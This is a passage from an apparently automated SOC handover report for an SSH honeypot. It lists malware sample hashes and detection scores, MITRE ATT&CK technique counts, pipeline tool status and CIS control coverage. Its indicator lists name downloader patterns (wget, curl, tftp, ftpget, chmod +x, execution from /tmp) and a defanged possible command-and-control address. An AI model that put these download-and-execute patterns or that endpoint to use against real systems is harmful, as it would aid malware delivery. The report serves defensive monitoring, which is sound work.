| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 170 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 157 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 8 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 6 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 6 |

---

## 🔕 False Positive Summary (259 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 259 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 259 cases |
| Tool 34  | Credential Extractor        | ✅ 176 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 75 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 259 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 53 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-12T22:55:56Z_
